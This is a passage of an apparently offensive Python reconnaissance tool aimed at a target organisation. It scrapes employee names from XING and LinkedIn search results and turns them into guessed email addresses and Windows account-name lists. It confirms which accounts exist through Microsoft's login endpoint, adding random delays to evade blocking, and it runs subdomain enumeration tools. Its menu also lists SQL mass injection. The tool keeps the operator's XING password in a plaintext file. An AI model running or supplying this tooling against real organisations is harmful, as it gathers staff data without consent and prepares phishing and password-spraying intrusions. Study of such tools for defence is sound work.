	print(Fore.RESET)
	while True:
		answer = input("Is this URL correct? (y/n): ")
		if answer == "y" or answer == "Y":
			break
		else:
			url = input("Ok, so what is the correct one (e.g. https://www.xing.com/pages/COMPANYNAME): ")
		
	#url = "https://www.xing.com/pages/audiag"

	#############################################################
	########### CREDENTIALS FOR YOUR XING ACCOUNT ###############
	########### NEEDED FOR AUTHENTICATION #######################
	#############################################################

	# uncomment the next line, if you want to store the credentials
	# inside this script and delete "session = 0":

	#session = login('xing-username@gmail.com','SecretPass')
	session = 0

	######## checking if credentials are provided ###############

	authentication_file = "auth.txt"

	def authentication():
		if os.path.exists(authentication_file) and os.path.getsize(authentication_file) > 0:
			print(Fore.YELLOW +"Valid credentials found!")
			print(Fore.RESET)
			f=open("auth.txt","r")
			lines=f.readlines()
			xing_user=lines[1].rstrip("\n")
			xing_pass=lines[2].rstrip("\n")
			f.close()
			return xing_user,xing_pass
		else:
			try:
				print("No credentials for XING found to make this script work!")
				xing_username = input("Your XING email (e.g. test@gmail.com): ")
				xing_password = input("Your XING password: ")
				print("Saving results into auth.txt..")
				sleep(1)
				f=open("auth.txt","a")
				f.write("[+] XING credentials\n")
				f.write(xing_username+"\n")
				f.write(xing_password+"\n")
				sleep(1)
				print("Successfully saved credentials..")
				f.close()
			except:
				print("Something went wrong..")
				exit(1)

	while True:
		try:
			global userXing
			global passXing
			creds = authentication()
			userXing = creds[0]
			passXing = creds[1]
			if userXing != 0 or passXing != 0:
				break
		except:
			pass

	session = login(userXing,passXing)

	#############################################################
	#############################################################
	####### ALTERNATIVELY USE THE CONFIG FILE auth.txt ##########
	#############################################################
	#############################################################

	if session != 0:
		LOGIN_COOKIE = session
		count = 2999

		api = "https://www.xing.com/xing-one/api"
		headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_x64) AppleWebKit/537.11 (KTHML, like Gecko)', 'Content-type': 'application/json', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Encoding':'none','Accept-Language':'en-US,en;q=0.8','Accept-Charset':'ISO-8859-1,utf-8,q=0.7,*;q=0.3', 'cache-control':'no-cache','Connection':'keep-alive'}
		cookies_dict = {"login": LOGIN_COOKIE}

		if (url.startswith('https://www.xing.com/pages/')):
			try:
				before_keyword, keyword, after_keyword = url.partition('pages/')
				company = after_keyword

				# retrieve company id from the api
				postdata1 = {"operationName":"EntitySubpage","variables":{"id":company,"moduleType":"employees"},"query":"query EntitySubpage($id: SlugOrID!, ) {\n entityPageEX(id: $id) {\n ... on EntityPage {\n slug\n  title\n context {\n  companyId\n }\n  }\n }\n}\n"}
				r = requests.post(api, data=json.dumps(postdata1), headers=headers, cookies=cookies_dict)
				response1 = r.json()
				#print(response1)
				companyID = response1["data"]["entityPageEX"]["context"]["companyId"]

				# retrieve employee information from the api based on previously obtained company id
				postdata2 = {"operationName":"Employees","variables":{"consumer":"","id":companyID,"first":count,"query":{"consumer":"web.entity_pages.employees_subpage","sort":"CONNECTION_DEGREE"}},"query":"query Employees($id: SlugOrID!, $first: Int, $after: String, $query: CompanyEmployeesQueryInput!, $consumer: String! = \"\", $includeTotalQuery: Boolean = false) {\n  company(id: $id) {\n id\n totalEmployees: employees(first: 0, query: {consumer: $consumer}) @include(if: $includeTotalQuery) {\n total\n }\n employees(first: $first, after: $after, query: $query) {\n total\n edges {\n node {\n profileDetails {\n id\n firstName\n lastName\n displayName\n gender\n pageName\n location {\n displayLocation\n  }\n occupations {\n subline\n }\n }\n }\n }\n }\n }\n}\n"}
				r2 = requests.post(api, data=json.dumps(postdata2), headers=headers, cookies=cookies_dict)
				response2 = r2.json()
				
				legende = "E-Mail"
				global dump_count
				dump_count = 0
				

				# loop over employees, output in format "g.schmidt@google.com" 
				pathlib.Path('recon').mkdir(parents=True,exist_ok=True)
				f=open('recon/emails.txt','a')
				for employee in response2['data']['company']['employees']['edges']:
					firstname = employee['node']['profileDetails']['firstName']
					lastname = employee['node']['profileDetails']['lastName']
					fullName = firstname[0] + '.' + lastname + msuffix
					if (' ' in fullName) == False:
						f.write('%s\n' % fullName) # only save emails without any spaces to clean up the list
					
					#print(firstname[0] + '.' + lastname + msuffix)
				f.close()

				# same process for full employee names like "guenther.schmidt@google.com"
				f=open('recon/fullname-emails.txt','a')
				for employee in response2['data']['company']['employees']['edges']:
					dump_count += 1
					firstname = employee['node']['profileDetails']['firstName']
					lastname = employee['node']['profileDetails']['lastName']
					fullName = firstname + '.' + lastname + msuffix
					if (' ' in fullName) == False:
						f.write('%s\n' % fullName)
					
					#print(firstname[0] + '.' + lastname + msuffix)
				f.close()
				print("Searching XING for valid emails.")
				print(Fore.GREEN + "Found {} emails!".format(dump_count))
				print(Fore.RESET)

			except:
				# likely authorization error due to incorrect 'login' cookie
				# otherwise the script is broken or the api has been changed
				print(Fore.RED + "No emails found at Xing.")
				print(Fore.RESET)
				#print("[!] Authentication required. Login failed!")

				#print("[debug] " + str(e))
		else:
			print()
			print("[!] Invalid URL provided.")
			print("[i] Example URL: 'https://www.xing.com/pages/appleretaildeutschlandgmbh'")


# CrossLinked by m8r0wn

class CrossLinked():
	URL = {'google': 'https://www.google.com/search?q=site:linkedin.com/in+"{}"&num=100&start={}',
		   'bing': 'http://www.bing.com/search?q=site:linkedin.com/in+"{}"&first={}'}

	def __init__(self, engine, company, timeout, conn_timeout, headers={}, proxies=[], jitter=1, safe=False, debug=False):
		self.links = []
		self.timeout = timeout
		self.proxies = proxies
		self.headers = headers
		self.conn_timeout = conn_timeout
		self.debug = debug
		self.safe = safe
		self.jitter = jitter

		self.engine = engine
		self.company = company
		self.key = 'linkedin.com/in'

		self.linkedin = {}
		self.users = {}
		self.user_count = 0
		self.output_count = 0

	def search(self):
		timer = self.start_timer()
		self.total_links = 0		# Total Links found by search engine
		self.page_links = 0		 # Total links found by search engine w/ our domain in URL
		found_links = 0			 # Local count to detect when no new links are found

		while timer.running:
			if self.total_links > 0 and found_links == self.page_links:
				timer.stop()
				return self.links

			found_links = self.page_links
			search_url = self.generateURL()
			resp = web_request(search_url, timeout=self.conn_timeout, headers=self.headers, proxies=self.proxies)

			if get_statuscode(resp) != 0:
				self.user_output(resp)
				self.pageParser(resp)
		timer.stop()
		return self.links

	def start_timer(self):
		timer = TaserTimeout(self.timeout)
		if self.timeout > 0:
			timer.start()
		return timer

	def generateURL(self):
		return self.URL[self.engine].format(self.company, self.page_links)

	def user_output(self, resp):
		if self.user_count > self.output_count:
			logger.info("{} : {}".format(self.user_count, resp.request.url))
			self.output_count = self.user_count

	def pageParser(self, resp):
		for link in extract_links(resp):
			try:
				url = str(link.get('href')).lower()
				self.total_links += 1
				if extract_webdomain(url) not in [self.engine, 'microsoft.com']:
					self.page_links += 1
					if self.key in url and self.extract_linkedin(link, self.company):
						self.user_count += 1
			except:
				pass

	def extract_linkedin(self, link, key_word):
		'''
		Primary method responsible to parsing name from link string in
		search results. This is a hot mess @todo covert 2 regex!
		'''
		if self.safe and key_word.lower() not in link.text.lower():
			return False

		try:
			# Sanitize input
			x = unidecode(link.text.split("|")[0].split("...")[0])

			# Extract Name (if title provided)
			name = x.strip()
			for delim in ['-','|']:
				if delim in x:
					name = link.text.split("–")[0].strip()

			try:
				# Quick split to extract title
				title = link.text.split("-")[1].strip()
				title = title.split("...")[0].split("|")[0].strip()
			except:
				title = "N/A"

			# Split name - first last
			tmp = name.split(' ')
			name = ''.join(e for e in tmp[0] if e.isalnum()) + " " + ''.join(e for e in tmp[1] if e.isalnum())

			# Exception catch 1st letter last name - Fname L.
			tmp = name.split(' ')
			if len(tmp[0]) <= 1 or len(tmp[-1]) <=1:
				raise Exception("\'{}\' Failed name parsing".format(link.text))
			elif tmp[0].endswith((".","|")) or tmp[-1].endswith((".","|")):
				raise Exception("\'{}\' Failed name parsing".format(link.text))

			k = name.lower()
			if k not in self.linkedin:
				self.linkedin[k] = {}
				self.linkedin[k]['last'] = unidecode(name.split(' ')[1].lower())
				self.linkedin[k]['first'] = unidecode(name.split(' ')[0].lower())
				self.linkedin[k]['title'] = title.strip().lower()
				self.linkedin[k]['format'] = formatter(args.nformat, self.linkedin[k]['first'], self.linkedin[k]['last'])
				logger.debug("PASS: {} (SAFE:{}) - {}".format(self.engine.upper(), self.safe, link.text), fg='green')
				return True

		except Exception as e:
			logger.debug("ERR: {} (SAFE:{}) - {}".format(self.engine.upper(), self.safe, str(e)), fg='yellow')

		logger.debug("FAIL: {} (SAFE:{}) - {}".format(self.engine.upper(), self.safe, link.text), fg='red')
		return False

def ntlmrecon_checker():
	print("Checking for ntlmrecon")
	try:
		ntlmrecon_type = which("ntlmrecon")
		if isinstance(ntlmrecon_type, type(None)):
			print(Fore.YELLOW + "[-] ntlmrecon is not found")
			print(Fore.RESET)
			ntlmrecon_install = str(input("Do you want to install it now? (Y/N): "))
			if ntlmrecon_install == "Y" or ntlmrecon_install == "y":
				os.popen("sudo pip3 install ntlmrecon").read()
				sleep(3)
				if which("ntlmrecon") is None:
					print(Fore.RED + "[-] Unable to install ntlmrecon. Please do it manually.")
					print(Fore.RESET)
					exit(-1)
				print(Fore.GREEN + "[+] Successfully installed ntlmrecon!")
				print(Fore.RESET)
				return True
			else:
				print("Hm. Ok.")
		else:
			print(Fore.GREEN + "[+] found NTLMRecon!")
			print(Fore.RESET)
			return True
	except:
		print(Fore.RED + "something went wrong!")
		print(Fore.RESET)
		exit

def crunch():
	question_for_crunch = str(input("Do you want to bruteforce common samaccountnames / user names (Y/N): "))
	if question_for_crunch == 'Y' or question_for_crunch == 'y':
		char_count = input("How many characters you want to bruteforce? Default is (3): ")
		if char_count.isdigit() == True:
			print("Bruteforcing alphabetical chars with crunch with the length of %s" % (char_count))
			pathlib.Path('recon').mkdir(parents=True,exist_ok=True)
			os.popen("crunch %s %s abcdefghijklmnopqrstuvwxyz -o recon/samaccountnames.txt" % (char_count,char_count)).read()
			print(Fore.YELLOW + "[+] Saved results under recon/samaccountnames!")
			print(Fore.RESET)
		else:
			print("Invalid input.")
	else:
		print("Ok!")

def extract_links(resp):
	links = []
	soup = BeautifulSoup(resp.content, 'lxml')
	for link in soup.findAll('a'):
		links.append(link)
	return links

def formatter(nformat, first, last):
	name = nformat
	name = name.replace('{f}', first[0])
	name = name.replace('{first}', first)
	name = name.replace('{l}', last[0])
	name = name.replace('{last}', last)
	return name

def getUsers(engine, args):
	print("Searching {} for valid employee names from linkedin at \"{}\"".format(engine, key_word))
	c = CrossLinked(engine,  key_word, args.timeout, 3, args.header, args.proxy, args.jitter, args.safe,args.debug)
	if engine in c.URL.keys():
		c.search()
	if not c.linkedin:
		logger.warning('No results found')
	return c.linkedin

def crosslinked(args):
	names = {}
	for engine in args.engine:
		for name, data in getUsers(engine, args).items():
			try:
				nformat="{first}.{last}"+msuffix
				id = formatter(nformat, data['first'], data['last'])
				if id not in names:
					names[id] = data
			except:
				pass

	for id, data in names.items():
		if args.verbose:
			logger.success("{:30} - {}".format(data['first']+" "+data['last'], data['title']))
		ledger.info(id)

def emailExistsOutlook(email):
    try:
        # Delay between requests
        delay = random.uniform(1, 3)
        # Maximum jitter to add to the delay
        max_jitter = 0.5

        # Random jitter
        jitter = random.uniform(0, max_jitter)
        time.sleep(delay + jitter)

        # Define User-Agent header
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"

        # Define additional HTTP headers
        headers = {
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }

        get_credential_type_url = "https://login.microsoftonline.com/common/GetCredentialType"

        # Check if user account exists in Azure AD.
        response = requests.post(get_credential_type_url, json={"Username": email}, headers=headers)

        # Check if the account exists in Azure AD
        if response.status_code == 200 and response.json().get("IfExistsResult") in [0, 5, 6]:
            # Parse the JSON response
            json_response = response.json()
            if json_response.get("IfExistsResult") == 0:
                print(f"{Fore.GREEN}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                print(f"BOOM! SUCCESS: {Fore.YELLOW}{email}{Fore.GREEN}")      
                print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" + Style.RESET_ALL)
                print(f"Verified via Outlook: IfExistsResult: 0 (Valid Email Address)\n")
                return True
            elif json_response.get("IfExistsResult") == 5:
                print(f"{Fore.GREEN}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                print(f"BOOM! SUCCESS: {Fore.YELLOW}{email}{Fore.GREEN}")
                print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" + Style.RESET_ALL)
                print(f"Verified via Outlook: IfExistsResult: 5 (Valid Email Address)\n")
                return True
            elif json_response.get("IfExistsResult") == 6:
                print(f"{Fore.GREEN}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                print(f"BOOM! SUCCESS: {Fore.YELLOW}{email}{Fore.GREEN}")
                print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" + Style.RESET_ALL)
                print(f"Verified via Outlook: IfExistsResult: 6 (Valid Email Address)\n")
                return True

        return False

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] You are probably rate-limited. Try changing your IP.{Style.RESET_ALL}")
        exit()
	
def getTheirMails():
    # Prompt user for employee's full name and domain
    full_name = input("Enter the full name of the employee: ")
    domain = input("Enter the domain name for emails (e.g., @company.com): ")
    print("Slowing down the requests a bit to avoid getting blocked by Microsoft. PLEASE BE PATIENT!")

    # Extract first name and last name
    first_name, last_name = full_name.lower().split(" ")
    first_name = first_name.replace("ä", "ae").replace("ü", "ue").replace("ö", "oe").replace("ß", "ss")
    last_name = last_name.replace("ä", "ae").replace("ü", "ue").replace("ö", "oe").replace("ß", "ss")

    # Handle hyphenated names
    if "-" in first_name:
        first_name_initials = "-".join([name[0] for name in first_name.split("-")])
        first_name_patterns = [
            f"{first_name_initials}.{last_name}{domain}",
            f"{first_name_initials[0]}-{last_name}{domain}",
            f"{first_name[0]}.{last_name}{domain}",
            f"{first_name[0]}{last_name}{domain}",
            f"{first_name_initials[0]}.{last_name}{domain}",
            f"{first_name_initials[0]}{last_name}{domain}"
        ]
    else:
        first_name_patterns = [
            f"{first_name}.{last_name}{domain}",
            f"{first_name[0]}.{last_name}{domain}",
            f"{first_name[0]}{last_name}{domain}",
            f"{last_name}.{first_name}{domain}",
            f"{last_name}.{first_name[0]}{domain}",
            f"{last_name}{domain}",
            f"{last_name}_{first_name}{domain}",
            f"{last_name}_{first_name[0]}{domain}",
            f"{last_name[:3]}{domain}",
            f"{last_name[:2]}{domain}",
            f"{last_name[:4]}{domain}",
            f"{last_name[:5]}{domain}",
            f"{first_name}-{last_name}{domain}",
            f"{first_name}_{last_name}{domain}"
        ]

    if "-" in last_name:
        last_name_patterns = [
            f"{first_name}.{last_name.replace('-', '')}{domain}",
            f"{first_name[0]}.{last_name.replace('-', '')}{domain}",
            f"{first_name[0]}{last_name.replace('-', '')}{domain}",
            f"{last_name.replace('-', '')}.{first_name}{domain}",
            f"{last_name.replace('-', '')}.{first_name[0]}{domain}",
            f"{last_name.replace('-', '')}{domain}",
            f"{last_name.replace('-', '')}_{first_name}{domain}",
            f"{last_name.replace('-', '')}_{first_name[0]}{domain}",
            f"{last_name.replace('-', '')[:3]}{domain}",
            f"{last_name.replace('-', '')[:2]}{domain}",
            f"{last_name.replace('-', '')[:4]}{domain}",
            f"{last_name.replace('-', '')[:5]}{domain}",
            f"{first_name}-{last_name.replace('-', '')}{domain}",
            f"{first_name}_{last_name.replace('-', '')}{domain}"
        ]
    else:
        last_name_patterns = [
            f"{first_name}.{last_name}{domain}",
            f"{first_name[0]}.{last_name}{domain}",
            f"{first_name[0]}{last_name}{domain}",
            f"{last_name}.{first_name}{domain}",
            f"{last_name}.{first_name[0]}{domain}",
            f"{last_name}{domain}",
            f"{last_name}_{first_name}{domain}",
            f"{last_name}_{first_name[0]}{domain}",
            f"{last_name[:3]}{domain}",
            f"{last_name[:2]}{domain}",
            f"{last_name[:4]}{domain}",
            f"{last_name[:5]}{domain}",
            f"{first_name}-{last_name}{domain}",
            f"{first_name}_{last_name}{domain}"
        ]

    # Combine first name and last name patterns
    email_patterns = first_name_patterns + last_name_patterns

    # Print colored output
    found_email = False
    for email_pattern in email_patterns:
       if emailExistsOutlook(email_pattern):
           found_email = True
           break
    
    if found_email is True:
        return
    
    for email_pattern in email_patterns:
        if emailExists(email_pattern):
            found_email = True
            print(f"{Fore.GREEN}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            print(f"BOOM! SUCCESS: {Fore.YELLOW}{email_pattern}{Fore.GREEN}")
            print("Verified via Microsoft Azure!")
            print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++" + Style.RESET_ALL)
            break

    if not found_email:
        print(f"{Fore.RED}No email found for the provided naming convention.{Style.RESET_ALL}")

def emailExists(email):
    try:
        # Delay between requests
        delay = random.uniform(1, 3)
        # Maximum jitter to add to the delay
        max_jitter = 0.5

        # Random jitter
        jitter = random.uniform(0, max_jitter)
        time.sleep(delay + jitter)

        # Define User-Agent header
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"

        # Define additional HTTP headers
        headers = {
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }

        get_credential_type_url = "https://login.microsoftonline.com/common/GetCredentialType"

        # Check if user account exists in Azure AD.
        response = requests.post(get_credential_type_url, json={"Username": email}, headers=headers)

        # Check if the account exists in Azure AD
        if response.status_code == 200 and response.json().get("IfExistsResult") == 0:
            # Parse the XML response
            xml_response = response.text
            if "<IsFederatedNS>true</IsFederatedNS>" in xml_response:
                federation_brand_name = xml_response.split("<FederationBrandName>")[1].split("</FederationBrandName>")[0]
                return f"Unknown (Federated domain handled by {federation_brand_name})"
            else:
                return True

        return False

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] You are probably rate-limited. Try changing your IP.{Style.RESET_ALL}")
        exit()

if 0 == 0:
	args = argparse.ArgumentParser(description="", formatter_class=argparse.RawTextHelpFormatter, usage=argparse.SUPPRESS)
	args.add_argument('--debug', dest="debug", action='store_true',help=argparse.SUPPRESS)
	args.add_argument('-t', dest='timeout', type=int, default=20,help='Max timeout per search (Default=20, 0=None)')
	args.add_argument('-j', dest='jitter', type=float, default=0,help='Jitter between requests (Default=0)')
	args.add_argument('-v', dest="verbose", action='store_true', help="Show names and titles recovered after enumeration")
	args.add_argument(dest='key_word', nargs='?', help='Target company name')

	s = args.add_argument_group("Search arguments")
	s.add_argument('-H', dest='header', type=str, default='', help='Add Header (\'name1=value1;name2=value2;\')')
	s.add_argument('--search', dest='engine', type=str, default='google,bing',help='Search Engine (Default=\'google,bing\')')
	s.add_argument("--safe", dest="safe", action='store_true',help="Only parse names with company in title (Reduces false positives)")

	o = args.add_argument_group("Output arguments")
	o.add_argument('-f', dest='nformat', type=str, help='Format names, ex: \'domain\{f}{last}\', \'{first}.{last}@domain.com\'')
	o.add_argument('-o', dest='outfile', type=str, default='names.txt', help='Change name of output file (default=names.txt')

	p = args.add_argument_group("Proxy arguments")
	pr = p.add_mutually_exclusive_group(required=False)
	pr.add_argument('--proxy', dest='proxy', action='append', default=[], help='Proxy requests (IP:Port)')
	pr.add_argument('--proxy-file', dest='proxy', default=False, type=lambda x: file_exists(args, x), help='Load proxies from file for rotation')
	args = args.parse_args()

	logger = setup_consoleLogger(logging.DEBUG if args.debug else logging.INFO)
	ledger = setup_fileLogger(args.outfile, mode='w')
	setattr(args, 'header', delimiter2dict(args.header))
	setattr(args, 'engine', delimiter2list(args.engine))

# clean email list a bit after scraping them
def cleanup():
	try:
		pathlib.Path('recon').mkdir(parents=True,exist_ok=True)
		os.popen("cat names.txt >> recon/fullname-emails.txt 2>/dev/null")
		os.popen("rm -rf names.txt 2>/dev/null")
		os.popen("sed -i 's/ö/oe/I' recon/fullname-emails.txt; sed -i 's/ä/ae/I' recon/fullname-emails.txt; sed -i 's/ß/ss/I' recon/fullname-emails.txt; sed -i 's/ü/ue/I' recon/fullname-emails.txt 2>/dev/null")
		os.popen("sort -u --ignore-case recon/fullname-emails.txt -o recon/fullname-emails.txt 2>/dev/null")
		os.popen("cat recon/fullname-emails.txt | awk -F\".\" '{print substr($1,1,1),$2,$3}' OFS='.' > recon/emails.txt 2>/dev/null")
		os.popen("cat recon/fullname-emails.txt | awk -F\".\" '{print substr($1,1,1),$2,\".\"$3}' OFS='' > recon/fl-emails.txt 2>/dev/null")
		os.popen("cat recon/fl-emails.txt | cut -d'@' -f1 | sed 's/\.//g' > recon/samaccountname-full.txt")
		os.popen("cat recon/fl-emails.txt | cut -d'@' -f1 | sed 's/\.//g' | sed 's/.$//g' > recon/samaccountname-minus1.txt")
		os.popen("cat recon/fl-emails.txt | cut -d'@' -f1 | sed 's/\.//g' | sed 's/..$//g' > recon/samaccountname-minus2.txt")
		os.popen("cat recon/fl-emails.txt | cut -d'@' -f1 | sed 's/\.//g' | sed 's/...$//g' > recon/samaccountname-minus3.txt")
		os.popen("cat recon/fl-emails.txt | cut -d'@' -f1 | sed 's/\.//g' | sed 's/....$//g' > recon/samaccountname-minus4.txt")
		os.popen("cat recon/fl-emails.txt | cut -d'@' -f1 | sed 's/\.//g' | sed 's/.....$//g' > recon/samaccountname-minus5.txt")

		pipe = os.popen("cat recon/fullname-emails.txt 2>/dev/null| wc -l | tr --delete '\n'")
		output_counter_of_emails = pipe.readline()
		
		print()
		print(Fore.YELLOW + "+++++++++++++++++++++++++++++++++++++++++++++")
		print(Fore.YELLOW + "	FOUND TOTAL UNIQUE EMAILS: {}".format(output_counter_of_emails))	  	  
		print(Fore.YELLOW + "+++++++++++++++++++++++++++++++++++++++++++++")
		print(Fore.RESET)
		print("[+] Saving results at \"recon\"\n")
	except:
		print("Could not cleanup the lists..")

# main menu for selections
def main_menu():
	while True:
		print(Fore.YELLOW + "--------------------------------------------")
		print("  Main Menu. Please choose your selection!")
		print("--------------------------------------------")
		print(Fore.RESET)
		fields = ('(1) Email addresses gathering with OSINT\n'
                           '(1b) Get E-Mail convention of your target\n'		
				'(2) Subdomain enumeration\n'
				'(3) NTLM endpoint enumeration\n'
                '(4) SQL Mass Injection\n'
		  	  '(q) to quit\n\n'
				  'Your choice: ')
		choice = input(fields)
		print("")
		if choice == "1":
			crunch()
			xing_dumper()
			crosslinked(args)
			cleanup()
		
		if choice == "1b":
			getTheirMails()

		elif choice == "2":
			print(Fore.BLUE + "--------------------------------------------")
			print("      Subdomain Menu. Please choose!")
			print("--------------------------------------------")
			print(Fore.RESET)
			fields = ('(1) - All-in-One Recon - subdomains and active testing (WAF, Zone Transfer, etc.)!\n'
				'(2) - Subdomain enum only using more tools\n'
		  	   '(3) - Power enum with waybackurls and gau\n'
		  	   '(r) - return\n'
		  	  '(q) - to quit\n\n'
				  'Your choice: ')
			choice = input(fields)
			if choice == "1":
				urllib3.disable_warnings()
				warnings.simplefilter('ignore')
				global domain
				domain = input("Specify domain name without http or https (e.g. google.com): ")
				checkDomain(domain)
				try:
					pathlib.Path('subdomains').mkdir(parents=True,exist_ok=True)
					SDom(domain,"subdomains/domains.txt")
					portScan(domain)
					ns_enum(domain)
					axfr(domain)
					mail_enum(domain)
					ip_enum(domain)
					ipv6_enum(domain)
					txt_enum(domain)
					whoisLookup(domain)
					basicEnum(domain)
					findBackups(domain)
					findSecrets(domain)
					cloudgitEnum(domain)
					wafDetector(domain)
					checkActiveSubs(domain,doms)
					wayback(domain)
					subTakeover(doms)
					try:
						file.close()
						continue
					except:
						pass
				except Exception as e:
					print("[-] Could not run the checks!")
					print(e.message)
				except KeyboardInterrupt:
					sys.exit(c.RED + "\n[!] Interrupt handler received, exiting...\n" + c.END)
					
			if choice == "2":
				print("\nChecking dependencies..")
				try:
					try:
						os.popen("chmod +x ./tools/*")
						check_amass = subprocess.Popen(["./tools/amass", "-h"], stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
						check_amass.wait()
						check_amass.poll()
						print(Fore.GREEN + "\n[+] Found Amass!")
						check_amass = subprocess.Popen(["./tools/assetfinder", "-h"], stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
						check_amass.wait()
						check_amass.poll()
						print(Fore.GREEN + "\n[+] Found Assetfinder!")		
						check_sublist3r=subprocess.Popen(["python","./tools/sublist3r.py"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
						check_sublist3r.wait()
						check_sublist3r.poll()
						print(Fore.GREEN + "\n[+] Found Sublist3r!")	
						check_sublist3r=subprocess.Popen(["./tools/subfinder","-h"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
						check_sublist3r.wait()
						check_sublist3r.poll()
						print(Fore.GREEN + "\n[+] Found subfinder!")		
						check_sublist3r=subprocess.Popen(["python","./tools/turbolist3r.py", "-h"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
						check_sublist3r.wait()
						check_sublist3r.poll()
						print(Fore.GREEN + "\n[+] Found Turbolist3r!")	
						print(Fore.RESET)
						try:
							print(Fore.YELLOW + "Be careful! You are actively scanning targets.")
							print(Fore.RESET)
							threads_count = input("How fast do you want to scan? Provide the threads. Press enter for default value (1): ")
							domain_name = input("Which domain do you want to scan? (Example google.com):  ")
							if domain_name == "":
								print("No domain name provided..")
								print(Fore.RED + "Quitting..")
								print(Fore.RESET)
								break
							if threads_count == "":
								threads_count = 1
							else:
								threads_count = int(threads_count)
							answer_of_scan = input("Do you want to scan now? (y/n): ")
							if answer_of_scan == "Y" or answer_of_scan == "y" or answer_of_scan == "yes" or answer_of_scan == "":
								print("######################################################")
								print("Starting. Please be patient! Amass will take a while..")
								print("######################################################")
								pathlib.Path('subdomains').mkdir(parents=True,exist_ok=True)
								amass_args = "./tools/amass enum -v -src -brute -min-for-recursive 2 -d %s -o subdomains/tmp.txt" % (domain_name)
								run_amass = check_call(amass_args, shell=True)
								assetfinder_args = "./tools/assetfinder %s | tee -a subdomains/tmp.txt" % (domain_name)
								run_assetfinder = check_call(assetfinder_args, shell=True)
								subfinder_args = "./tools/subfinder -d %s | tee -a subdomains/tmp.txt" % (domain_name)
								run_subfinder = check_call(subfinder_args, shell=True)
								try:
									sublist_args = "python ./tools/sublist3r.py -d %s -t %s 2>/dev/null | tee -a subdomains/tmp.txt" % (domain_name, threads_count)
									run_sublist = check_call(sublist_args, shell=True)
								except CalledProcessError:
									pass
								turbo_args = "python ./tools/turbolist3r.py -d %s -t %s 2>/dev/null | tee -a subdomains/tmp.txt" % (domain_name, threads_count)
								try:
									run_turbo = check_call(turbo_args, shell=True)
								except CalledProcessError:
									pass
								# clean up wordlist
								print("\n[+] Cleaning up the wordlist.\n")
								run_cleanup = subprocess.getoutput('cat subdomains/tmp.txt | grep "\." | grep -v "[-]" | grep -v "___" | cut -d "]" -f2 | sed "s/^[ \\\\t]*//" | sort -u > subdomains/domains.txt')
								delete_tmp_file = subprocess.getoutput('rm -rf subdomains/tmp.txt')	
								print(Fore.GREEN + "[+] Saved results to subdomains/domains.txt")
								print(Fore.RESET)
								try:
									print("[+] Now let's try to get live domains, shall we?")
									print("[+] Checking only ports 80,443,8080,8443,8000.\n")
									httpx_args = "cat subdomains/domains.txt | httpx -p 80,443,8080,8443,8080 -silent -ip -sc | tee -a /tmp/httpx_output.txt"
									httpx_args2 = "cat /tmp/httpx_output.txt | cut -d ' ' -f1 > subdomains/live.txt"
									run_httpx = check_call(httpx_args, shell=True)
									run_httpx2 = check_call(httpx_args2, shell=True)
									print(Fore.RESET + "\n[+] Saved results under subdomains/live.txt")
								except:
									print("[-] Could not run httpx. Did you installed it?")								
							else:
								print("Okay, see you.")
							
						except:
							print(Fore.RED + "[-] Something went wrong..")
							print(Fore.RESET)
					except:
						print(Fore.RED + "[-] Tools not found. Did you download the tools folder?")
						print("Quitting..")
						print(Fore.RESET)
				except:
					print("Did not worked")
			elif choice == "3":
				reverse_lookup_question = input(Fore.YELLOW + "Using external APIs such as ViewDNS.info. Please provide registrant name, email or domain name of your target: ")
				print(Fore.RESET)
				if reverse_lookup_question != "":
					print("\nChecking dependencies..")
					check_knock = subprocess.Popen(["./tools/knockknock", "-h"], stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
					check_knock.wait()
					check_knock.poll()
					print(Fore.GREEN + "\n[+] Found Knockknock!")
					print(Fore.RESET)					
					try:
						knockknock_args = "./tools/knockknock -n %s -p" % (reverse_lookup_question)
						run_knockknock = check_call(knockknock_args, shell=True)
						run_merge_domains = subprocess.getoutput('cat domains.txt >> subdomains/domains.txt; sort -u subdomains/domains.txt; rm -rf ./domains.txt')
					except:
						print("Something went wrong.")
				else:
					print(Fore.RED + "No valid string detected to search for.")
					print(Fore.RESET)

			elif choice == "4":
				print("Checking dependencies!")
				try:
					print("Let's see..")
					os.popen("chmod +x ./tools/*")
					check_wayback=subprocess.Popen(["./tools/waybackurls", "-h"], stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
					check_wayback.wait()
					check_wayback.poll()
					print(Fore.GREEN + "\n[+] Found Waybackurls!")
					check_gau=subprocess.Popen(["./tools/gau","-h"], stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
					check_gau.wait()
					check_gau.poll()
					print("\n[+] Found Gau!")
					print(Fore.RESET)
				except:
					print("Something went wrong with checking gau and waybackurls within tools folder.")
				try:
					ask_for_domains = input("Do you want to use your domains.txt file? (Y/N): ")
					if ask_for_domains == "Y" or ask_for_domains == "y":
						if pathlib.Path("./subdomains/domains.txt").is_file():
